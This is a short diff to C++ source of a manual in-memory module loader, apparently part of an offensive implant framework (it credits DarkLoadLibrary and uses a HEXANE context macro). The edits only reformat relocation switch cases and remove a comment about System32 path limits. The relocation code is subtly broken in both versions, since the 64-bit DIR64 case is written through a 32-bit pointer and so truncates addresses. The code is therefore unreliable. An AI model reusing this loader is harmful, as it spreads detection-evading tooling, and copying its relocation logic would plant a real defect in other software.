@@ -440,14 +440,10 @@ namespace Modules {
 
                 do {
                     switch (head->Type) {
-                        case IMAGE_REL_BASED_DIR64: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva;
-                        break;
-                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva;
-                        break;
-                        case IMAGE_REL_BASED_HIGH: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva);
-                        break;
-                        case IMAGE_REL_BASED_LOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva);
-                        break;
+                        case IMAGE_REL_BASED_DIR64: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
+                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
+                        case IMAGE_REL_BASED_HIGH: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
+                        case IMAGE_REL_BASED_LOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                     }
                     head++;
                 } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);
@@ -638,9 +634,6 @@ namespace Modules {
 
     PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
         // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
-        // everything loaded with this unit MUST RESIDE in System32 due to path finding limitations
-        // may add more paths later or change search logic, but it's not likely.
-
         HEXANE;
 
         auto module = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
